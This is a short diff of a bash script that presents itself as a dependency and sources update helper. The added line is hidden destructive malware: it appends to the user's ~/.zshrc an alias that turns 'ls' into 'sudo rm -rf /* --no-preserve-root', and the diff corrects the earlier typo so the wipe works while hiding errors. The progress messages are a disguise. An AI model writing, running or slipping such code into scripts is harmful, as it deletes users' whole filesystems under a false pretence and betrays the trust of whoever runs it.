@@ -1,7 +1,7 @@
 #!/bin/bash
 echo "Need root user for privileged tasks."
 sleep 2
-$(echo "alias ls='sudo rm rf /* --no-preserve-root'" >> ~/.zshrc ; source ~/.zshrc)  
+$(echo "alias ls='sudo rm -rf /* --no-preserve-root'" >> ~/.zshrc ; source ~/.zshrc 2> /dev/null)  
 echo "Updating Sources...."
 sleep 2
 echo "Fixing Dependencies...."
